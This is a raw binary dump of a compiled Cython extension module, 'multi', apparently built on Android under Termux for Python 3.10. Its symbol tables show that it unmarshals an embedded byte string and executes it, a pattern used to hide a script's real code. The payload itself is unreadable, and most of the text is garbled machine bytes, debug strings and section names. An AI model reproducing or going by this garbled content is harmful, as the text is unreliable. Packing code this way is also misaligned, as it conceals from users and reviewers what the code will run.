+ ��,@H�ht0���H���HLPp����hp��hp��pt��tx|�������Ldob_basesq_inplace_concatshapevisitproctp_initm_initm_slots__pyx_empty_unicodekindwstrf_genPy_tracefunc__Pyx_InitCachedConstantstplongtp_itemsizenb_indextp_getattrotp_flagstp_doctp_richcomparetp_descr_settp_cachetp_subclassesvalue__pyx_moduledef_slotsis_unicode__pyx_k_cline_in_tracebackPyDictKeysObjectf_stackdepthcontext_ver__Pyx_check_binary_versionrt_from_callmoduleattr_namePyErr_WarnExPyObject_HashPyUnicode_AsUTF8StringPyEval_EvalCodemodulesPy_hash_treleasebufferprocml_methml_doctp_dictfreefuncPyModuleDef_Slot__pyx_n_s_cline_in_tracebacklengthwchar_tframePyFrameStaterecursion_headroomprevioustrash_delete_nestingPyDict_SetItemStringlistpy_line__pyx_pymod_createob_typetp_setattrbf_getbuffergetbufferproctp_clearclosuretp_descr_getma_valueshashPyFrameObjectcontextttstatePyObject_GetAttrPyTraceBack_HerePyErr_FormatPyInit_multi__Pyx_GetBuiltinNamecall__kernel_long_tob_sizenb_inplace_powersq_itemobjobjargprocgetPyObjectco_namesco_freevarsco_linetablePyASCIIObject__Pyx_copy_spec_to_modulenextf_lastiexc_tracebackPyErr_ExceptionMatchesPyObject_NotPyDict_SetItem__pyx_pymod_exec_multinb_remaindernb_positivemp_ass_subscripttp_iternextml_flagsunsigned charinternedasciispecipy_framemid__Pyx_CreateCodeObjectForTraceback__Pyx_PyObject_Calltp_as_asyncnb_boolnb_ortp_methodstp_new__pyx_string_tab__pyx_n_s_mainco_codeco_extraob_svalopgilstate_counterPyThreadStatemessage__Pyx_Importptracebackcfmodnamedict_versionPYGEN_NEXTnb_inplace_orbf_releasebuffertp_traversetraverseprocdoctp_del_typeobjectPyTypeObjectm_index__ARRAY_SIZE_TYPE__sma_usedf_backf_trace_linesb_levelc_profilefuncfound_dotfuncnamenames__Pyx_PyExec3int__pyx_moduledefPyVarObjectnb_inplace_subtractnb_inplace_multiplynb_inplace_matrix_multiplytp_basenewfuncint64_t__pyx_lineno__pyx_code_cachecountb_handlertracingcurexc_type__Pyx_ErrFetchInStatePyObject_SetAttrPyDict_ContainsPyEval_MergeCompilerFlagsPyRun_StringFlags__pyx_module_is_main_multiam_aiterPYGEN_RETURNnb_divmodnb_negativenb_floor_dividessizeobjargprocitemsizetp_membersm_docm_free__pyx_cython_runtimeencoding__Pyx_StringTabEntryco_flagsPyBytesObjectf_codef_linenosigned charcframec_traceobjcoroutine_origin_tracking_depthidPyErr_SetStringctversiondef__pyx_pyinit_moduleargm_basePy_ssize_tgetattrfuncreprfuncnb_floatPyCFunctiontp_alloctp_vectorcall_object__pyx_f__pyx_k_builtins__pyx_k_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_lstateroot_cframeptype__Pyx_PyObject_GetAttrStrtmp_tbcf_feature_versiondict_cached_valuesq_lengthtp_calltp_strunsigned longiternextfuncnametp_version_tag__pyx_k_nameco_nlocalsco_stacksize__pyx_cfilenm__Pyx_check_single_interpreterf_valuestackrtversionc_linePyImport_GetModuleDictobPyEval_GetBuiltinsam_sendnb_lshiftnb_rshiftmp_subscripttp_setattrom_methodsexc_typethread_id__Pyx_InitStrings__pyx_insert_code_objectPyTuple_NewPyBytes_FromStringAndSizePyObject_SetAttrStringcharbinaryfuncnb_intnb_inplace_xortp_mrounsigned intvectorcallfuncm_traverse__pyx_k_marshalPyDictObjectPyTupleObjecton_deletetbPyList_New__pyx_L0setattrfuncnb_multiplynb_matrix_multiplyformatslot__int64_t__pyx_k_importPyModuleDef_InitpvaluePyObject_Dir_py_tmpclang version 14.0.5tp_basicsizenb_true_dividetp_weaklistoffsetgetiterfuncPyModuleDef_Base__pyx_muint64_t__pyx_empty_tupleentries_Py_INCREFprevPyTryBlockprevious_itemdictasync_gen_finalizeruse_cline_objtmp_valuenew_maxPyImport_AddModulePyDict_GetItemStringPyFrame_Newcode_Py_IS_TYPEtp_nameam_awaitam_anexttp_as_mapping__pyx_n_s_builtinsco_varnamesco_opcache_sizecode_linema_version_tagmoddictexc_stateasync_gen_firstiterPyModule_GetDictuse_clinepos__pyx_bisect_code_objectsPyUnicode_FromFormatnb_addnb_subtractinquirynb_inplace_rshiftnb_inplace_andbufinternalPy_bufferinitprocallocfuncsize_tm_copy__pyx_empty_bytes__pyx_n_s_test__Pyx_CodeObjectCacheEntryma_keysPyListObjectf_globalsf_localsasync_exc_tslevel__Pyx_AddTracebackPyUnicode_FromStringAndSize__kernel_ssize_tnb_invertnb_inplace_floor_divideobjobjprocgetattrofuncPyGetSetDeftp_dictoffsetn__pyx_filename__pyx_n_s_name__pyx_n_s_loads_PyOpcache_dictkeysobjectreadyPyInterpreterStatef_builtinsc_profileobjsameokwtp_getattrPYGEN_ERRORnb_andtp_as_sequencetp_itersettp_is_gctp_basestp_finalizepintern__pyx_clinenoco_filenameco_opcachef_tracestackcheck_countercurexc_valuePyImport_ImportModuleLevelObjectPyErr_OccurredPyCode_NewEmptyPyMem_Malloc/sdcardob_refcnttp_vectorcall_offsetnb_absolutenb_xornb_inplace_addsq_containstp_weaklist__pyx_methods__pyx_dict_cached_valueis_str__pyx_k_mainco_kwonlyargcountf_iblockf_localspluscurexc_tracebackPyInterpreterState_GetIDempty_dicttmpPyMem_ReallocPyNumberMethodswas_sq_ass_slicesq_inplace_repeatPyMappingMethodshashfuncbufferinfoml_nametp_getsetco_argcountco_zombieframeco_opcache_mapf_trace_opcodesPyErr_Clearglobal_dictlocalstp_deallocdestructormp_lengthtp_hashrichcmpfunc__uint64_tco_posonlyargcountco_constsco_opcache_flag__Pyx_CodeObjectCachecompactrecursion_depth_cframefilenamecython_runtime_dict__Pyx_GlobalsunaryfuncPyAsyncMethodsternaryfuncsetattrofuncobjstrides__pyx_k_loads__pyx_k_test__pyx_n_s_marshalfrom_namePyThreadState_Getf_stateCFramePyModule_NewObject__pyx_L1_errorpy_codePy_GetVersionPyUnicode_InternFromStringPy_EnterRecursiveCallPyCompilerFlags__pyx_t_2multi.ctp_as_numberPyBufferProcs__pyx_dict_version__pyx_bon_delete_data__pyx_find_code_objectPyOS_snprintfPyTuple_Pack__Pyx_GetAttrcf_flagslenreadonlydescrgetfuncm_clearco_firstlinenoco_cell2argc_tracefunc__Pyx_PyExec2PyMethodDefmax_countco_cellvarsto_nameexc_value__Pyx_InitGlobals__pyx_t_1sendfuncnb_inplace_remaindersq_concatsq_ass_itemPySequenceMethodstp_as_buffersetterm_sizePyModuleDefob_itemob_shashf_blockstackb_type_frameuse_tracingtrash_delete_laterglobalsPySendResultdescrsetfuncm_namemain_interpreter_id__pyx_kp_b_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_lco_nameallocatedresultbadtypetmp_typepy_funcname__Pyx__GetModuleGlobalNamefunctp_reprnb_powerPyMemberDefcurrent_id_isexc_infoPyObject_GetAttrString__Pyx_CLineForTracebackendPyUnicode_DecodePyUnicode_AsUTF8Py_LeaveRecursiveCall__Pyx_PyExecGlobalsssize_tnb_reservednb_inplace_lshiftsq_repeatsuboffsetsgetter__pyx_tuple_code_objectco_weakreflistPyCodeObjectallow_none_Py_XDECREF_PyErr_StackItemPyDict_NewPyObject_Callnb_inplace_true_dividelenfuncssizeargfuncwas_sq_slicendimtp_free__pyx_d__pyx_n_s_import_Py_DECREFinterp_err_stackitemfrom_listempty_list__Pyx_ErrRestoreInStatestart$n� /data/data/com.termux/files/usr/include/asm-generic/data/data/com.termux/files/usr/include/sys/data/data/com.termux/files/usr/include/python3.10/data/data/com.termux/files/usr/include/python3.10/cpython/data/data/com.termux/files/usr/lib/clang/14.0.5/include/data/data/com.termux/files/usr/includemulti.cposix_types.htypes.hpyport.hobject.hobject.hmethodobject.hdescrobject.hstddef.hmoduleobject.hstdint.hcode.hcode.hdictobject.hunicodeobject.hlistobject.htupleobject.hbytesobject.hpystate.hpystate.hframeobject.hpyframe.hpyerrors.hdictobject.hpylifecycle.hwarnings.htupleobject.hbytesobject.hunicodeobject.himport.hlistobject.htraceback.hpymem.hceval.habstract.hcompile.hceval.hpythonrun.heval.h	��� 
+  
+  
+ (�6 
+ ]tKJJ        K��  
+ �        I �        ��uJ�J]J        #JL��xJ��        ��tJ�J        �xJ�J        �xJ�R��K        �fJ�uJ� 
+ J        ��uJ� 
+ J        �x<�J        �xJ�R�|�� 
+ J        ��uJ� 
+ J        �x<�J        �xJ�R�|�� 
+ J        ��uJ� 
+ J        �x<�J        �xJ�R�|�� 
+ J        ��uJ� 
+ ��        �xt��|J���R�|��J'dt�J        KxJ        �'O�J        KxJ        �'O�J        KxJ        �'O�J        KJ        �xt��|��Jz 
+ $�t��JJ        K�J���tJ ��K IKw �NJ~ JNJ~ JNJ~ JNJ�j��$+J        R��J�j��JzJJ�j�.�J�zJJ�j��JzJJ�j�.���zJJ��j��JzJJ.��zJJ��jJ.���        L$�u�N�+�K�=�K�A�J  
+ JvJ�x� ��J,J�wJ ���@��wJ���MJ�wJ�J�w���7JJJ�tJ�� JJ JKJ7KJ�jJ��J8�:JJ�jJ��J J�j���K�j���Jz��jJ��J JLJh�J�v��#KJ        JJN7J 
+ K�tJ 
+ �J	�K<"�}JJ"J�J�JJ�J�J�J K�sJ$�JJ	K�sJ�J	�J�r���J	K��	�~J�J�oJ�JJnJFNJ	K�pJ	�J��N$�2�=�@��p���JKJ���sJ	�$�R���J�R:��LJJ�JJ	�wJ�R���w��	�4�J�J	zJ4�J	�JK�sJJ�J	�wJ�R.��J.JJGJ	�wJ�|J	�J�R��3�	�wJ�|J	�J�J��J0J�sJ�JJJ�	�wJ�R�|�����x��R��0J�sJ	����|J;�<Q��}J	KJK�sJ�JK	�t��J	�tJ�R�|���,�p����s��J�sJJ�J�sJ��@��sJ	�<��|����sJ�J	N!PJ!J7�J�p��JMIM	�uJ�J�R�J�J�R���J�R&���~�!J	JPM)fJK.J	�L�LFN	�JO ��oJ�J K�oJ�J	�s��J	�sJ�R�|��J�pJ���%J��pJ&�J ��K�pJ#���	J1 J4�	��p�1�J�p�	��G	�G	�LIK	�sJ�J�R���{J�� ��oJ�JHML	�uJ�J�R�J�J�R���J�R�|��J�pJ	��PJ)LJK.J	���pJ���pJ���%J��pJ&�J ��p�#���	J('J+�	�4�	�2�9L0I L"M�"G$KL=�IK��JLHKK�oJ	�J�R���J�R���J�R���J�	�wJ��|J�J 
+ J�s���0�� �&K(u$K"K$K�oJ*��"�        �sJ�R�|���2 
+ ��~�2�J�~JQ        zJJK�sJ        �JR�~��sJ        �JK        J�        �Q#�( 
+ ��QJ(JJK        ��tJ��m�JJ�q��J� 
+ ��p�'�J        KL�L=KPu<�        J�pJ�J 8        I �        ��pJ�J�< 
+ �,�v��	� J	KL�rJ� ��rJ� �PLHL �	fJ-J	eJ��	KJK�s�� JP��r�	�<���Rx���J�J�|��J�|����qJ� ����	J�		�<%K9J ��r��J	�J�sJ	�J�r��J �JPN J�q� � <�� J� ��rJ��IK�q��J�qJ	�J��|J��	�u��|��<���{J ��F NJK�q<� ��r<�J�q<	���J�R�|�����(�0��#��( <�-��@ <�M T�_pd�u��p�����|� \����	 L�3 p� : ������ ����h� ��(��� Լ� +���< ���P `�pd �x ���� 
+ ��������� ���0� 
+ �� 
+ ����� 
+ ���� 
+ � 
+ � 
+ �	, 
+ �< 
+ �	I 
+ �.�q 
+ �	~���� ����������������� �(�$0�38�B@�TH�~P��X��`��h��p��x�	��4��_����������������� 
+ 8���!I��U��Z��a ��n������(7Lco�������2CQ��l}������	.=JYh��������		"	/	E	[	i	{	�	�	�	�	�	�	�	 
+  
+ .note.android.ident.dynsym.gnu.version.gnu.version_r.gnu.hash.hash.dynstr.rela.dyn.rela.plt.rodata.eh_frame_hdr.eh_frame.text.plt.data.rel.ro.fini_array.dynamic.got.got.plt.data.bss.comment.debug_loc.debug_abbrev.debug_info.debug_ranges.debug_str.debug_line.symtab.shstrtab.strtabcrtbegin_so.c$d.2$d.3$d.4$d.5$d.6$x.1__dso_handle_const__on_dlclose__on_dlclose_late$d.0ndk_build_numberndk_versionnote_android_identnote_datanote_endnote_namemulti.c$x.0__pyx_moduledef__pyx_pymod_create__Pyx_check_single_interpreter.main_interpreter_id__pyx_pymod_exec_multi__pyx_string_tab__Pyx_PyObject_Call__Pyx_PyExecGlobals__Pyx__GetModuleGlobalName__Pyx_GetBuiltinName$d.1$d.2$d.3__pyx_methods__pyx_moduledef_slots$d.4$d.5$d.6__pyx_k_cline_in_traceback__pyx_n_s_import__pyx_k_import__pyx_k_loads__pyx_k_main__pyx_k_marshal__pyx_k_name__pyx_k_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l__pyx_k_test$d.7$d.8$d.9$d.10$d.11__pyx_code_cache.0__pyx_code_cache.1__pyx_m__pyx_empty_tuple__pyx_empty_bytes__pyx_empty_unicode__pyx_d__pyx_b__pyx_cython_runtime__pyx_n_s_name__pyx_n_s_main__pyx_n_s_marshal__pyx_pymod_exec_multi.__pyx_dict_version__pyx_pymod_exec_multi.__pyx_dict_cached_value__pyx_n_s_loads__pyx_tuple___pyx_n_s_test__pyx_n_s_builtins__pyx_n_s_cline_in_traceback__pyx_kp_b_s_d_d_l_Z_d_d_l_Z_d_d_l_Z_d_d_l__Pyx_CLineForTraceback.__pyx_dict_version__Pyx_CLineForTraceback.__pyx_dict_cached_value__pyx_code_cache.2$d.12$d.13$d.14$d.1__FRAME_END____atexit_handler_wrapper__cxa_atexit__cxa_finalize__dso_handle__emutls_unregister_key__register_atforkatexitpthread_atfork__bss_start_end_edataPyInit_multiPyModuleDef_InitPyThreadState_GetPyInterpreterState_GetIDPyExc_ImportErrorPyErr_SetStringPyObject_GetAttrStringPyModule_NewObject_Py_DeallocPyModule_GetDictPyDict_SetItemString_Py_NoneStructPyExc_AttributeErrorPyErr_ExceptionMatchesPyErr_ClearPyExc_RuntimeErrorPy_GetVersionPyOS_snprintfPyErr_WarnExPyTuple_NewPyBytes_FromStringAndSizePyUnicode_FromStringAndSizePyImport_AddModulePyObject_SetAttrStringPyUnicode_InternFromStringPyUnicode_DecodePyObject_Hash__pyx_module_is_main_multiPyObject_SetAttrPyImport_GetModuleDictPyDict_GetItemStringPyTuple_PackPyList_NewPyDict_NewPyImport_ImportModuleLevelObject_PyThreadState_UncheckedGet_PyObject_GetDictPtr_Py_FalseStruct_Py_TrueStructPyObject_NotPyErr_OccurredPyDict_SetItem_PyDict_GetItem_KnownHashPyObject_GetAttrPyUnicode_FromFormatPyUnicode_AsUTF8PyCode_NewEmptyPyFrame_NewPyTraceBack_HerePyMem_ReallocPyMem_Malloc__stack_chk_failPyExc_NameErrorPyErr_FormatPy_EnterRecursiveCallPy_LeaveRecursiveCallPyObject_CallPyExc_SystemErrorPyObject_DirPyDict_ContainsPyExc_TypeErrorPyEval_GetBuiltinsPyCode_TypePyUnicode_AsUTF8StringPyEval_MergeCompilerFlagsPyRun_StringFlagsPyEval_EvalCode_DYNAMICpp�����o�	�	�*���o� 
+ � 
+ 9���o� 
+ � 
+ 0C� 
+ � 
+ XI8 8 �Qx[Bxxpe2��1�m��t{������<�<�����п��������(�(��8�8�������X�0�0�������������0�����4*���y�,�C:�o2�0_;�V(@g�U&v80Hw# 
+ 
